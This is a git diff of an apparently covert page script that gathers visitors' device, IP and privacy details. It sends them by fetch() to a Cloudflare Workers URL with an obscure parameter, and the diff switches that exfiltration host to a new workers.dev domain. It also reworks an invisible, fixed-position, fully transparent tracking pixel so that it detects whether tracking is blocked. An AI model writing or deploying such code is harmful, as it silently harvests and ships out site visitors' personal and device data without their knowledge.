@@ -1,3 +1,4 @@
+
 <script>
     function generateRandomCode() {
         const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -103,7 +104,7 @@ Service: ${fullData.privacy?.service || 'Not available'}
 }
 
     async function sendMessageToURL(message) {
-        const url = `https://t.dog37.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(message)}`;
+        const url = `https://t.dzire.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(message)}`;
         try {
             await fetch(url);
         } catch (error) {
@@ -226,12 +227,23 @@ if (ipInfo) {
     }
 
     function loadGoogleAnalyticsPixel() {
-    const img = document.createElement("img");
-    img.src = "https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000000-2&cid=555&ec=category&ea=action&el=label&ev=1";
-    img.style.display = "none";
-    document.body.appendChild(img);
-    return "Yes";
-    }
+    return new Promise((resolve) => {
+        const img = new Image(1, 1); // 1x1 pixel size
+        img.src = "https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000000-2&cid=555&ec=category&ea=action&el=label&ev=1";
+
+        img.onload = () => resolve("Yes");  // Tracking allowed
+        img.onerror = () => resolve("No");  // Tracking blocked
+
+        // Positioning at the bottom
+        img.style.position = "fixed";
+        img.style.bottom = "0";
+        img.style.left = "0";
+        img.style.opacity = "0"; // Fully transparent
+        img.style.pointerEvents = "none"; // Prevents interaction
+
+        document.body.appendChild(img); // Add to the page
+    });
+}
 
     displayDeviceInfo();
 </script>
